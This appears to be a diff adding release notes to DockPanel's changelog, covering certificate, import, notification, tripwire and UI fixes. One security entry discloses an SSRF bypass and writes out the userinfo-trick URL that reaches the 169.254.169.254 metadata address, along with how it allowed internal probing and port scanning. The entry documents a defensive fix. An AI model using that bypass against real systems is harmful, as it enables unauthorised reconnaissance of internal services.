+document root, PHP version and ACME contact, all of which live in the panel's
+database, and the agent has no database. So every click returned
+`Operation failed. Reference: {uuid}` — indistinguishable from a transient fault,
+which invites a retry — and wrote an internal-error record blaming an agent that
+was working perfectly.
+
+The panel now performs the renewal itself. Doing it here rather than in the agent
+is also what makes it arrive: an agent is only updated when somebody updates it.
+A certificate that belongs to no site gets a sentence explaining what the panel
+found instead of a reference number, and every one-click fix now writes the
+activity-log entry the documentation has always promised.
+
+### Fixed — an uploaded certificate was invisible to everything that watches certificates
+
+Uploading a certificate recorded only that SSL was on. It did not record when the
+certificate expires — and the expiry countdown, the expiry alert ladder and the
+auto-healer all skip rows without one. The one kind of certificate nobody renews
+for you was the kind the panel watched least. Uploads now record the expiry and
+the installed paths, and a failed read-back no longer clears a date the panel
+already had.
+
+### Fixed — "we don't know" was rendered as a green OK badge
+
+A certificate with no known expiry counted as 999 days away, which the
+certificate list showed as **OK**, and any status the page did not recognise fell
+back to **OK** as well. Both now read **Unknown**, and the countdown column shows
+a dash rather than inventing a number.
+
+### Fixed — administrators were shown findings no screen could show them
+
+The agent's diagnostics scan the whole host, so an administrator on a shared box
+was told a certificate was expiring while the certificate list — scoped to their
+own sites — could not display it. **Monitoring → Certificates** now has an *All
+certificates on this server* switch for administrators, listing every site's
+certificate with its owner, plus the certificates the host holds that belong to
+no site at all: DNS-01 wildcards, Docker app certificates, anything installed by
+hand. Those are marked as not managed here and offer no controls, because there
+is no site for the controls to act on. If the server's agent predates this
+release and cannot enumerate certificates, the page says so rather than implying
+the list is complete.
+
+### Fixed — the documented Auto-Fix list described fixes that did not exist
+
+Two of the three examples in the security-hardening guide — repairing file
+permissions and disabling debug mode — were implemented by neither of the two fix
+systems. The guide now lists what each screen can actually do, and a regression
+pin fails the build when a fix is added or removed without the list catching up.
+
+## [2.138.0]
+
+### Added — import a database dump you already have
+
+**Databases → Import** loads a `.sql.gz` into an existing database. It is the
+other half of [#121](https://github.com/ovexro/dockpanel/issues/121), which asked
+for database import alongside the upload failure fixed in 2.137.0.
+
+The panel does not take the dump through the browser, and that is a decision
+rather than a shortfall. An upload travels base64-encoded inside a JSON body
+capped at 2 MiB — about 1.5 MB of file — and almost no real dump fits inside that.
+So import uses the shape the Migration wizard has always used: **you place the
+file on the server, the panel takes its name.** A 40 GB archive already moves
+through this product that way.
+
+That choice is also what makes the feature small and safe. The panel never accepts
+a path: it lists one directory per database, the agent pins that directory, and the
+door refuses any name outside the character set backup files use. The importer itself
+is not new. It already streamed `.sql.gz` into the database container for the migration
+wizard, validating every identifier it puts on a command line, passing the password by
+environment rather than argv, and reading the child's exit status instead of treating
+end-of-file as success. What was missing was the door.
+
+**Import is administrator-only**, which is a security boundary and not a policy choice.
+The dump directory is named after the database, and names are reusable: deleting a
+database removes its container but not its dumps, and `databases.name` is unique only
+per site. A tenant-reachable listing would therefore let whoever next took a freed name
+read — and load — the previous holder's leftover dumps. Row-scoping cannot close that,
+because files with no backup row are exactly what this door exists for. Restricting it
+to administrators costs nothing real: putting a file in that directory requires root, and
+an administrator can already read `/var/backups` directly.
+
+**A file that is listed but cannot be used says why, and is never offered.** Encrypted
+panel backups (restore those from Backup Manager, which holds the key), MongoDB archives
+on a SQL database, dumps that were never gzipped, and filenames carrying a character
+backup files cannot use — `scp "my dump.sql.gz"` produces one — are each shown with the
+reason and, where there is one, the exact command that fixes it. The rule the listing
+displays is the same call the import door enforces, so a request that skips the UI gets
+the same sentence rather than a failure from inside a decompression pipe.
+
+**A file you copy in but cannot import is now listed and explained.** The listing
+used to skip anything that was not `.sql.gz`, so an operator who copied `dump.sql`
+into the directory saw an empty list with no explanation anywhere in the product.
+Such files now appear greyed out with the reason and the exact `gzip` command that
+fixes it — in the panel and in `dockpanel backup db-list` alike. Only gzipped
+dumps can be imported, because the restore path streams through `gunzip`; the
+answer to that was to say so, not to widen the gate.
+
+### Fixed — a database restore reported failure while it was succeeding
+
+Restoring a database from Backup Manager waited 60 seconds and then reported
+`agent request timed out after 60s`, which the panel turned into a bare incident
+reference. The restore itself carried on and completed — the agent gives it ten
+minutes — so the operator was told that disaster recovery had failed at the exact
+moment it was working. Both restore paths now wait 270 seconds, which is
+deliberately just under the panel's own 300-second request ceiling so that the
+panel's explanation reaches you instead of a bodyless gateway timeout.
+
+And when that ceiling *is* reached, it is no longer reported as a failure. A
+timeout here means the panel stopped watching, not that the import stopped: it now
+says so in as many words and tells you not to run it again, because retrying an
+import on top of a database that is still being written to is the one genuinely
+destructive thing an operator could do with that information. The panel takes that
+timing itself rather than inferring it from the error it gets back — the two agent
+transports report a timeout differently, and on a multi-server install the difference
+would have reported a healthy import as an offline agent. Cloudflare's own 100-second
+cut is recognised as the same situation.
+
+### Fixed — a failed database restore no longer hides the reason it failed
+
+Every way a restore can fail is a fact about the file: truncated, never gzipped, meant
+for a different engine, or containing SQL the database rejects. All of them were reported
+as internal errors, so the panel replaced the database's own message with an incident
+reference — `psql`'s "relation already exists", the one line that says what to do next,
+was minted into a UUID and discarded. Restores now answer with the database's message,
+on this path and on Backup Manager's.
+
+### Fixed — three UI elements that were styled with colours the theme does not define
+
+`warning-500` and `ok-500` were used in three places and defined nowhere. Tailwind
+emits nothing for an undefined colour and warns about nothing, so the source read
+as styled and the pixels were not:
+
+- **"Save this token — it won't be shown again"**, the one-shot API-token warning
+  in Settings, rendered as ordinary grey text with no border and no background.
+- **The "this device" marker** in the active-sessions list — the badge that tells
+  you which session is your own, on the screen where you revoke sessions —
+  rendered with no colour at all.
+
+Both now use the theme's real families. A regression pin derives the palette from
+the stylesheet and the usage from the pages, so any future page asking for a
+colour that does not exist fails the build instead of rendering invisibly.
+
+### Fixed — smaller honesty defects found while reviewing the above
+
+- **"Nothing here to import"** was rendered underneath the error banner when the dump
+  listing could not be read at all — a positive claim about a directory nobody had
+  managed to look in. It now stays quiet unless a read succeeded.
+- **`database.imported`** is now in the Extensions event list. Firing an event that is
+  absent from the subscription checkboxes delivers it to nobody, with no way to fix that
+  from the UI.
+- **The import's audit row records which server it ran on.** On a fleet, two databases
+  may share a name, and a row that does not name the machine cannot answer the only
+  question anyone asks after a bad import.
+- **A test assertion in the SSL alerting engine could not fail.** `A || (d == 0 && A)`
+  is just `A`; the second half looked like extra coverage of the `d == 0` rung and was
+  the same comparison written twice.
+
+## [2.137.0]
+
+### Fixed — the file manager refused a file and would not say why
+
+Uploading anything larger than about 1.5 MB failed, and the panel gave no reason.
+A batch reported `0 uploaded, 1 failed` and erased that after three seconds. No
+size was named, no limit was named, and nothing distinguished a file that was too
+big from a server that was down. Reported as
+[#121](https://github.com/ovexro/dockpanel/issues/121) against a 33 MB upload.
+
+Two separate faults, and the fix needed both.
+
+**The number the panel advertised was one it could not enforce.** An upload is
+base64-encoded into a JSON request body, and that body is capped at 2 MiB by the
+web framework — at the panel, and again on the hop to the agent, which is a
+second service with the same default. Neither had ever raised it. Meanwhile the
+panel's own handler carried a 100 MB check and the agent's a 50 MB check, both
+sitting *below* the framework's rejection where they could never run. So the
+product named two limits, forty and thirty times too large, and enforced a third
+one silently. Both now read the real figure, 1.5 MB, which is what the request
+envelope actually carries once base64 has taken its third.
+
+**The refusal was thrown away on the way out.** The framework answers an oversize
+body with a `413` in plain text, which the API client correctly turns into a real
+error — and the upload page then discarded it in a `catch` that kept no reference
+to it. The reason existed at every step until the last one.
+
+Uploads are now checked in the browser *before* the upload is spent, and are
+refused with the file's size, the limit, and what to use instead. If a request
+does reach the server oversize, the server answers with the same sentence and a
+machine-readable marker rather than an unreadable framework page.
+
+### Fixed — six more controls that failed without saying why
+
+The upload page was not alone; the same `catch` shape was swallowing the reason
+on every one of these, so the class was fixed rather than the instance.
+
+- **Restarting nginx or PHP-FPM from the dashboard** discarded the agent's own
+  sentence. nginx refusing a bad configuration file — the message that names the
+  file and the line — was rendered as "Failed to restart Nginx". The panel keeps
+  a deliberate path for passing an agent's 4xx through intact; this control was
+  dropping it at the last step. The same class as #90, #91 and #92.
+- **Bulk-deleting DNS records** reported `Deleted N records` as a success even
+  when records failed to delete, because each failure was swallowed inside the
+  loop. It now reports the shortfall and the reason.
+- **Applying a DNS template** had the same shape: a template that created nothing
+  at all still reported success.
+- **The automatic security updates toggle** slid back with no explanation when the
+  change failed — which, on host families where `unattended-upgrades` is not the
+  mechanism, is the only outcome it can have.
+- **Installing a PHP extension** ended its spinner and left the extension in the
+  "available" list, with no message anywhere.
+
+Each of these now shows its failure next to the control that caused it, rather
+than in a banner elsewhere on the page.
+
+### Documentation
+
+`docs/guides/file-uploads.md` already described this behaviour accurately,
+including the unreachable checks — it is updated to reflect that the product now
+tells you itself, and to note that the public demo fronts the panel with a
+smaller nginx limit than a standard install.
+
+## [2.136.0]
+
+### Security — a monitor could read services it was never meant to reach
+
+The URL guard that is supposed to keep monitors and webhooks off internal
+addresses trusted a host it parsed by hand. It stripped the scheme, took the text
+up to the first `/`, then up to the first `:` — and for a URL like
+`http://example.com:x@169.254.169.254/` that reads `example.com`, which is public,
+so the check passed, while the HTTP client connected to `169.254.169.254`, the
+address after the `@`. The two disagreed about what the host was.
+
+Driven on a fresh box before this fix, an ordinary account — any login that is not
+suspended, not just an administrator — created an uptime monitor pointed at an
+internal-only service through that construct and read its HTTP status code and
+latency straight back, plus a keyword test that answered yes/no over the service's
+response body: an internal-address probe and a one-bit content oracle, re-armable
+on demand, fifty monitors to an account. The published guide promised the
+opposite, that all such URLs are rejected.
+
+The validator now parses with a real URL parser (`url::Url`), so the host it checks
+is the host a client would dial. Credentials in the address (`user:pass@host`) are
+refused outright — nothing this guard protects legitimately carries them, and the
+userinfo section was the whole trick. Alternate encodings of an internal address
+that used to slip through are covered: decimal, hex and octal IPv4, and the IPv6
+transition forms that embed an internal v4 (IPv4-mapped, NAT64 `64:ff9b::/96`,
+6to4 `2002::/16`, IPv4-compatible). The same guard runs again at send and check
+time, so a stored row whose DNS later flips to an internal address, or one imported
+past the create-time check, is blocked when it fires — verified live: a monitor
+stored under the old build began returning "URL blocked" the moment the fixed
+binary took over, with no change to the row.
+
+Three more holes in the same class, closed in the same change:
+
+- **A second, weaker copy** of the hand-rolled parser guarded extension webhooks.
+  It has been deleted; that path now shares the one validator, which is what makes
+  the guide's "all webhook URLs" true rather than most of them.
+- **TCP and ping monitors skipped the guard entirely** and connected to a bare
+  host:port, so the same account could scan internal ports and read
+  open/closed/filtered from the result. They are now validated at create, update
+  and check time by the same address rules — the HTTP lane's boundary, applied to
+  the lanes that were missing it.
+- **The monitor update endpoint never checked the monitor type**, so a monitor
+  could be moved to an unrecognised type and fall through to the HTTP path; update
+  now validates the type the way create always did.
+
+The validator was split into a small pure function that returns the host and port
+a client would connect to, pinned by an offline equality test (no DNS): a
+regression that returns to substring parsing reads the wrong host and turns it red
+on an air-gapped runner. A new source suite (`ssrf-url-guard-pin-e2e.sh`, 8
+assertions) forbids the hand-rolled shape in both files and keeps the tcp/ping
+lane wired; five new unit arms cover the parser and the classifier. 19 call sites
+of the URL guard and 4 of the new bare-host guard, across four backend files.
+
+No public issue reported this; it was found while re-measuring a carried item
+against the current code, then proven end to end on a throwaway VPS.
+
+## [2.135.0]
+
+### Fixed — an optional field you could not empty, and a confirmation you could not see
+
+Four reports arrived within four minutes from one operator reading the source.
+Two were defects, and both turned out to be classes rather than instances.
+
+**Clearing a field did nothing, and said it had worked.** Emptying any optional
+box on a Git Deploy — a post-deploy hook, a build command, a deploy schedule, an
+SSL address — returned 200 and left the value in place, back on the next reload.
+The form sent `null` for an empty box and the handler wrapped every column in
+`COALESCE($n, column)`, so "the client omitted this key" and "the operator
+emptied this box" arrived identically and the second silently became the first.
+A post-deploy hook that had been removed went on running.
+
+There are now three states on the wire instead of two: an absent key keeps the
+stored value, an empty string clears it, a value writes it. The empty string is
+a wire sentinel and is never stored — NULL stays this table's spelling of "not
+set", because `remove` reads the domain column with `unwrap_or(&name)` and a
+stored `""` would have handed the agent an empty site identifier.
+
+A derivation over the crate found **121 COALESCE-guarded columns across 12
+handlers**. The great majority are correct and untouched — an agent check-in
+that omits a metric must not blank the stored one, and a NOT NULL identifier has
+no "clear" to express. **Ten were genuine defects**, reached from five different
+screens, and all ten are fixed: Git Deploys (four fields), container policies'
+image allow-list, reseller white-label branding (three), and the status page's
+description and logo.
+
+**Removing a domain is now refused rather than ignored**, and the refusal says
+why: nothing in the git path takes an nginx vhost down, so accepting the clear
+would have dropped the panel's record of a config still proxying to the
+container. Renaming or deleting the deploy both still work.
+
+**A confirmation that rendered where you were not looking.** Clicking a control
+near the bottom of a page armed a confirmation bar at the top of it, so the click
+looked like it had done nothing at all. The reporter concluded the panel was
+refusing the switch and found the Confirm button by reading our source.
+
+It was not one misplaced div. A sweep of the SPA found this shape on screen after
+screen, and none of them carried a scroll, a focus, an ARIA role or any
+announcement — there is no toast system either — so arming produced no signal at
+all, only a layout shift that pushed the button down, out from under the cursor
+that had just clicked it. They clustered because writing a correct one was
+awkward, not because a dozen authors were careless.
+
+Confirmations now render through one shared dialog, portalled out of the page's
+scroll container: no offset to get wrong under four operator-selectable layouts,
+no tab to be stranded on, Escape to dismiss, and focus on Cancel rather than one
+Enter away from purging a Cloudflare zone. **17 confirmation prompts across 13
+screens** were converted. The ones that already swap Confirm and Cancel into the
+trigger's own row were correct and were left alone, as was the one that already
+rendered inside the card that arms it.
+
+### Fixed — a credential the panel showed to someone who did not own it
+
+Private repositories clone over SSH with a generated deploy key. The guide
+documented a different procedure — generate a key by hand, drop it in
+`/etc/dockpanel/deploy-keys/` — which cannot work: the only thing that records
+where a deploy's key lives is the **Generate Deploy Key** button, and clicking it
+later deletes a hand-placed key. The one path that works appeared in no document.
+
+Operators pushed into that gap reach for `https://TOKEN@github.com/...`, which
+clones immediately and stores a live token in the deploy's repository URL. The
+panel then printed it back on three screens — one of them the deploy approval
+queue, whose reader is an administrator of the machine rather than the operator
+who configured the deploy. Credentials in a repository URL are now masked
+wherever the panel renders one, and masked server-side on the approval queue, so
+the token is not in the response body either. The guide documents the working
+procedure and says plainly why a token in the URL is the wrong answer.
+
+### Documented — Git Deploys have no persistent storage
+
+A Git Deploy container has no volumes and no bind mounts, and every deploy
+replaces the container, so anything the application writes to its own filesystem
+is gone on the next push. Nothing said so anywhere: not the guide, not the UI,
+not the feature register — while the neighbouring Docker Apps screen advertises
+"Persistent Volumes". The first deploy works and the loss happens on the second,
+which is usually much later and looks unrelated.
+
+The guide now states the limitation and names the alternatives that do survive.
+It also warns against the workaround that looks obvious: adding a
+`docker-compose.yml` switches the deploy onto a path that never reads the Domain
+field, never writes a vhost, never issues a certificate and never removes the
+running container — so the domain would go on serving the previous build
+indefinitely while the panel reported success. Volumes on Git Deploys are tracked
+as unbuilt work, not declined.
+
+### Tests
+
+New `clearable-fields-pin-e2e.sh` (27 assertions) derives both halves of the
+clear-a-field class — the COALESCE-guarded columns from the crate, the
+null-for-empty form fields from the SPA — and pins the intersection with a
+per-pair count, so a regrowth on an update payload fails even in a file whose
+create payload legitimately has one. `reachable-controls-pin-e2e.sh` gains §H
+(33 → 37), deriving every page that arms a confirmation and requiring it to
+render through the shared dialog. Two Rust unit tests cover the URL masking,
+including the two-`@` authority that distinguishes a correct parse from one that
+leaves the secret on screen. 80 → 81 suites, 2641 → 2672 assertions.
+
+## [2.134.0]
+
+### Fixed — controls that named a destination and did not go there
+
+A panel-wide sweep of **436 controls** — every link, button and redirect whose
+label names somewhere specific — after v2.133.1 turned up a third instance of the
+same defect within an hour of the second. It is not a 404: the link "works", so
+nothing reports it. The operator lands one tab short and finishes the navigation
+by hand, or lands on an empty screen.
+
+The root cause for most of them was that the destination could not be named.
+Only five pages read a tab from the URL; the rest opened on their default
+whatever the link said, so writing a correct link was impossible.
+
+**Three pages gained deep-link support**, copying the `resolveTab` shape
+`Monitoring.tsx` and `Security.tsx` already use:
+
+- **Settings** — five tabs, opened on General. Every "configure X in Settings"
+  message in the product landed one tab short of X.
+- **Telemetry** — opened on Events while the Updates tab holds everything the
+  Dashboard's update banner promises.
+- **Logs** — opened on Site Logs, a file tailer, while two legacy URLs redirect
+  here for the audit trail and the system events they are named for.
+
+**Controls repointed at what they name:**
+
+- `Configure alert channels →` on the notifications page → `?tab=channels`
+  (reported by Ovidiu).
+- `Enable 2FA` in the Getting Started checklist → `/account`. It pointed at
+  Settings, where personal 2FA enrolment does not exist in any tab — the only
+  2FA control there is the admin policy that requires it of *other* users. All
+  three layouts' own 2FA banner already said "Enable it from My Account".
+- `View all` over **Active Issues** → the Alerts tab. Those rows come from the
+  `alerts` table, and the link went to Monitors — empty on any install without
+  uptime monitors, which is exactly when alerts fire.
+- `View all` over **Recent Activity** → the Audit Log tab. It listed
+  `activity_logs` rows and sent you to a tab that tails nginx files.
+- `Diagnostics` in the Dashboard header → `?tab=diagnostics`. The constant for
+  it was already in that file and already used by the Health stat cell.
+- `View Update` → `?tab=updates`.
+- `Go to Settings → Services` (Mail) and the PowerDNS setup cross-reference
+  (DNS) were raw `<a href>` — a full page reload that discards the router — and
+  neither could reach the Services tab. Both are now `Link`s that name it.
+- `View Sites` / `View Databases` after a migration were also `<a href>`, so
+  finishing a migration and clicking through reloaded the app and threw away the
+  report you had just produced.
+- Five legacy URL aliases now name their tab: `/alerts`, `/activity`,
+  `/system-logs`, `/diagnostics`, `/security-hardening`.
+
+### Added — three more class arms in `notifications-pin-e2e.sh`
+
+- **§4c** — no dashboard link into monitoring may drop its tab, and the health
+  pill's destination must derive from the same condition as its label.
+- **§4d** — a `?tab=` link must point at a page that actually reads the
+  parameter. Writing one against a page that ignores it is a no-op with a URL
+  that claims otherwise, and it looks exactly like a fix.
+- **§4e** — an in-app route must be reached with `Link`, never `<a href>`.
+  `/api/*` and anything opening a new tab are allowed.
+
+2639 → 2641 assertions; 20/20 mutations killed.
+
+## [2.133.1]
+
+### Fixed — "System Issues Detected" did not lead to the issues
+
+The Dashboard's health pill is raised by **firing alerts** (`intel.firing_alerts
+> 0`), and it linked to a bare `/monitoring` — which resolves to the **Monitors**
+tab. So clicking the thing that told you something was wrong took you to a list
+of uptime monitors, and on an install with none configured that is an empty
+screen while alerts are firing. On the demo right now: 2 alerts firing, 0
+monitors.
+
+The page already knew the right destination. `REC_ACTION_ROUTES.alerts` is
+`/monitoring?tab=alerts`, three other links on that same screen use it, and
+`Monitoring.tsx` names `/monitoring?tab=alerts from the dashboard` in its own
+comment as the contract. This one link was the exception.
+
+The destination now follows the state that produced the label: firing alerts open
+the Alerts tab, a low health score with no alerts opens monitoring, and each
+state carries a `title` naming the reason (`2 firing alerts — open the Alerts
+tab`) instead of one fixed tooltip for all four.
+
+`notifications-pin-e2e.sh` §4c pins the convention rather than the link: no
+dashboard link into monitoring may drop its tab, and the pill's destination must
+be derived from the same condition as its label so the two cannot drift apart in
+silence again. 2637 → 2639 assertions; 18/18 mutations killed.
+
+Reported by Ovidiu, who clicked it.
+
+## [2.133.0]
+
+### Fixed — a notification centre where nothing was clickable, and the panel's loudest security events never reached it
+
+**Every notification was a dead end, and the destination was already in the
+database.** `panel_notifications.link` has existed since the notification centre
+shipped in March. The migration creates it, `notify_panel` binds it, the list
+endpoint SELECTs it, and the frontend types it as `link: string | null` — and
+the render never read it. `git log -S'n.link' -- panel/frontend/src` is empty
+across the whole history of the repository: the field was written, transported
+and typed for five months without being read once, while seventeen producers
+were passing a real destination the entire time. The panel knew which site had
+failed to deploy and made you go and find it.
+
+The title of a notification is now a link when the panel knows where the event
+happened, and following it marks the notification read. Every producer that had
+nowhere to point now points somewhere: alerts to the Alerts tab, monitors to
+Monitors, security events to the audit log, sites to the site. The single
+exception is *site deleted*, which is deliberately left unlinked and says so in
+the source — its subject no longer exists, and the catch-all route would land
+the operator on the Dashboard without explaining why.
+
+**The largest class of notification on a live panel did not go through
+`notify_panel` at all.** "Login from new IP" was a hand-written INSERT with its
+own column list, and the two columns it omitted were the two that matter:
+`link`, so that class could never become clickable, and the `NOTIF_TX`
+broadcast, so it was also the only class that never arrived without a page
+reload. On the demo it is 25 of 78 rows. A raw INSERT into a table with defaults
+succeeds whatever you leave out of the column list, so nothing could report this.
+
+**And it re-alerted for ever.** "Is this address new?" was answered by counting
+`user_sessions`, which the retention sweep truncates at 24 hours — so every
+address became new again the day after it was last used. Twenty-five alerts from
+five distinct addresses, fourteen of them the loopback of our own deploy script.
+The question is now asked of `security_audit_log`, which records every login
+with its address and is the one table a DELETE trigger refuses.
+
+**Three security paths delivered only to channels that do not exist by
+default.** `get_user_channels` returns `None` for a user with no `alert_rules`
+row, which is every user until somebody opens Settings and saves a destination.
+Emergency lockdown, the canary tripwire shipped in 2.132.0, and every uptime
+monitor state change delivered *exclusively* through it. So on a stock install
+the panel could lock every non-admin out for 24 hours, or detect an intrusion,
+and tell nobody: the event reached `security_audit_log`, which `Security.tsx`
+notes in its own comment is "the only surface where a `security_audit_log` row
+is ever seen". All three now also reach the notification feed.
+
+### Added — the notification centre is a screen you can work in
+
+- **It updates live.** The bell has been on the SSE stream since the feature
+  shipped; the list never was, so a notification arriving while you read it
+  stayed invisible until you reloaded — on the one screen whose purpose is to
+  show you what just happened. The stream payload now carries the complete row
+  (`id`, `read_at`, `created_at`), so an arrival can be rendered rather than
+  counted.
+- **Filter** by unread, or by any category the feed contains. The filter row is
+  built from the server's own `GROUP BY`, so a new producer's category appears
+  the first time it fires instead of waiting for someone to edit a list.
+- **Paging.** The list was a hard `LIMIT 50` with no offset, no cursor and
+  nothing in the UI able to ask for row 51 — on the demo, 28 of 78 notifications
+  had no route to the screen at all. `GET /api/notifications` now takes `limit`,
+  `before`, `category` and `unread`, and the page pages back through the feed.
+- **Delete** a notification, or **Clear read** to remove every one you have
+  already read. There was previously no way to remove a notification at all: the
+  only DELETE against the table in the entire product is the retention sweep.
+  Clear-read is scoped to `read_at IS NOT NULL`, so it can never discard
+  something unseen.
+- `GET /api/notifications/summary` returns the totals the list cannot carry, so
+  the page header and the bell badge stop deriving the same number two different
+  ways.
+- A failed notification INSERT is now logged instead of discarded. The one class
+  of message whose entire job is to tell you something went wrong was the class
+  that failed in silence.
+
+### Fixed — badges that read alike and meant different things
+
+The unread badge saturated at `> 9 ? "9+"` while the open-incident badge two
+rows away was uncapped, so a "9+" standing for 29 sat on the same screen as a
+"9" standing for 9. The cap moves to 99 and lives in one shared helper rather
+than in five copies across four layout files, and every bell states the exact
+figure on hover. The firing-alert pill in the Command header drew the *same bell
+glyph* as the notification bell over an unrelated number; it now has the alert
+glyph and the word "firing". The two counts on the Monitoring row are labelled
+apart.
+
+Two rendering bugs went with them. Both Monitoring pills carried their own
+`ml-auto`, and two auto margins in one flex row split the free space between
+them, so whenever both counts were live the pair drifted apart instead of
+sitting together at the end of the row. And `Icon` falls back to the dashboard
+glyph for an unknown name, silently — so the **Notifications** nav row wore the
+Dashboard icon in all three layouts, and **Servers** wore it in two of them,
+because those names were never added to the icon sets.
+
+Also: multi-line notification bodies rendered as one run-on line (`whitespace-
+pre-line`), the exact timestamp is available on hover, and the row's actions
+were revealed only by `group-hover` — which means they did not exist for a
+keyboard or on a touch screen.
+
+### Added — `tests/notifications-pin-e2e.sh`, 31 assertions, 16/16 mutations killed
+
+The durable half is a set of checks over the *class*, not over these defects:
+
+- Every column the list endpoint returns must be rendered by the page or waived
+  with a reason — the column list is derived from the endpoint's own SELECT, so
+  the next field plumbed end-to-end and dropped at the render fails here.
+- `notify_panel` must be the only writer of `panel_notifications`, so the next
+  hand-rolled INSERT that omits a column fails without anyone remembering this.
+- Every producer must pass a link, against an allow-list that carries its reason
+  and fails if it goes stale.
+- Every link a producer can emit must resolve against the SPA's own route table,
+  so a notification can never point at a screen that is not there.
+- Every icon name the nav registry declares must exist in every icon set.
+- The guide's cap, page size and category table must match the code.
+
+- A notification addressed to one user can reach a non-admin, while one
+  addressed to `None` fans out to admins only — so a link into an `adminOnly`
+  screen is safe in the second case and a 403 in the first. Both sides are
+  derived: the admin-only set from the nav registry, the recipient from the
+  call's own second argument.
+
+2606 → 2637 assertions across 79 → 80 suites. HTTP routes 825 → 828.
+
+### Fixed — the site rate-limit refusal now names the setting that changes it
+
+The per-user site-creation limit has been operator-settable since 2.46.0, under
+**Settings > Account > Security Hardening**. The one place a person actually
+meets it — the `429` when they hit it — said only that the limit exists. So
+[#116](https://github.com/ovexro/dockpanel/issues/116) arrived asking us to make
+configurable a number that already has a control, which is the correct
+conclusion to draw from the message we were sending. All three refusals (site
+create, its sibling in the same file, and staging) now name the screen and note
+that `0` removes the limit.
+
+## [2.132.1]
+
+### Fixed — arming the canaries raised an intrusion alert for the canaries that were already there
+
+The Arm control shipped in 2.132.0 plants each canary with a remove-then-write,
+so the file's access time moves. `security_check_canary_files` compares that
+against the `canary_atime_<path>` baseline it stored earlier and treats any
+increase as access — so on a host that already had canary files, arming raised a
+**CANARY TRIGGERED** alert for every one of them: a critical audit-log entry, a
+🚨 notification to every administrator, and a `record_suspicious_event` that
+feeds auto-lockdown.
+
+The default lockdown threshold is five suspicious events in ten minutes. A host
+hand-armed with the four legacy paths produces **four** on a single press — one
+short of locking every non-admin out of the panel for 24 hours, for pressing the
+button the panel had just told them to press. Caught on the live engine
+immediately after the 2.132.0 deploy, which raised exactly one such alert for
+`/var/www/.dockpanel-canary`, the only pre-existing path in the new plant set.
+
+`canary_arm` now deletes the stored baseline for each path the agent reports it
+created, which puts the sweeper back on its first-run branch: it records the new
+access time and returns without alerting. It cannot mask a real intrusion —
+the only baselines cleared are for files the agent created in that same request.
+
+Two arms added to `canary-arm-pin-e2e.sh`: one requires the clear, and one
+requires the baseline key to be spelled identically by the sweeper that WRITES it
+and the handler that DELETES it, since a drift there fails silently in the
+alerting direction. 2604 → 2606 assertions; 3/3 mutations killed.
+
+## [2.132.0]
+
+### Fixed — an intrusion tripwire that was switched on by default and had never watched a single file
+
+**Canary File Monitoring reported all clear because there was nothing on the
+wire.** `security_canary_enabled` is seeded `true`, the sweeper runs every two
+minutes outside the auto-healer's own switch, Settings rendered the toggle ON,
+and `docs/guides/security-hardening.md` stated without qualification that
+DockPanel "checks hidden canary files in sensitive directories (`/etc/`,
+`/root/`, `/home/`, `/var/www/`) every 2 minutes and alerts if their access times
+change".
+
+Nothing planted those files. The writer is the agent's
+`POST /security/canary/setup`, and it had **no caller anywhere** — not in the
+panel, not in the CLI, not in `setup.sh` or `install-agent.sh`. The only
+panel-side mention of it was a comment recording that it has no caller. So on
+every install the tripwire watched **zero** paths, and the one answer an
+intrusion detector must never give by default was the only one it could give.
+Silence is also what a working tripwire looks like, which is why four months of
+it read as protection.
+
+Three of the four advertised paths could never have been written in the first
+place. The agent unit runs `ProtectSystem=strict` with an explicit
+`ReadWritePaths=`, and bare `/etc`, `/root` and `/home` are not in it — measured
+under the shipped unit rather than inferred from it: all three refuse a write and
+only `/var/www` accepts one. `canary_setup` wrapped each write in
+`if …is_ok()` with no `else` and returned only what succeeded, so "armed 4 of 4"
+and "armed 1 of 4, silently" were the same response. `/root` and `/home` cannot
+be **watched** either — both daemons run `ProtectHome=yes`, which replaces those
+trees with an empty mount — so planting them by any means changes nothing, and
+widening the sandbox to reach them would cost more hardening than a tripwire is
+worth.
+
+**What changed.** The canaries now go where the agent can actually write them and
+this process can actually read them, which is also where this product keeps its
+own secrets: `/etc/dockpanel/`, `/var/lib/dockpanel/`, `/var/backups/dockpanel/`
+and `/var/www/` — the agent token, the panel database dumps, the runtime state
+and the web root. Someone looking for credentials goes there first, which makes
+them better tripwires than a home directory nobody can watch. The three legacy
+paths stay in the **watch** set, so a host armed by hand before this release does
+not silently stop being monitored.
+
+`POST /api/security/canary/arm` and `GET /api/security/canary-status` are new,
+both local-only for the same reason `telemetry::preview` is: the sweeper stats
+*this* host, so accepting the frontend's global `X-Server-Id` would report a
+fleet member as armed on the strength of the panel's own files. Settings now
+reports the **tripwire** rather than the setting — per-path `watching` /
+`absent` / `masked`, an explicit `NOT ARMED` state, and an Arm button that names
+what it could not create and why. `canary_setup` answers per path and its
+refusals are passed through to the operator.
+
+The guide now says what the feature does not do, using the convention its own
+neighbouring section already used: that it needed arming, that `/root` and
+`/home` can never be watched, that `relatime` may not register a second read
+within 24 hours, and that a backup or `updatedb` pass trips it too.
+
+### Added — `canary-arm-pin-e2e.sh`, a derived check over the whole class
+
+The durable half is not a check for this endpoint. §1 parses the agent's security
+router for every registered `/security/*` path and asserts each has a panel-side
+caller or an explicit allow-list entry naming why not, with a positive control so
+"nothing is severed" cannot be a broken matcher — the next severed agent endpoint
+fails the same arm. (`/security/db-backup` is allow-listed: `auto_healer.rs` runs
+the panel database dump itself with a direct `pg_dump`, under its own comment
+saying it does not need the agent client.) §2 pins the plant set against the
+**sandbox** rather than against a list, so a path either crate gains that the
+agent cannot write, that `ProtectHome=` masks, or that nothing watches, fails
+without anyone remembering this happened. 18 assertions; 15/15 mutations killed.
+
+The three-way `absent` / `masked` / `unreadable` decision moved into one
+`classify_canary`, so the screen and the sweeper cannot disagree about what a
+path is — and `access-recovery-pin-e2e.sh` now checks both that the classifier
+draws the distinction and that the sweeper still reaches it.
+
+## [2.131.0]
+
+### Fixed — a button labelled "Silence Alerts" that silenced five of nineteen alert types
+
+**The maintenance window suppressed the wrong half of the alerting.** The panel
+offers a *Silence Alerts* button, the Maintenance page said "Alerts are
+suppressed during maintenance windows", and the monitoring guide said "no alerts
+fire during the window". Exactly one service honoured any of it: `uptime.rs`,
+which skips its own monitor checks for the duration. The alert engine — which
+raises fourteen of the nineteen types that reach the alert-enable gate — had
+never read the `maintenance_windows` table at all.
+
+So the alerts a planned maintenance is *certain* to cause were precisely the ones
+that still paged: server offline, service down, container down, plus every
+resource threshold, the disk-full forecast, the memory-leak trend, the GPU checks
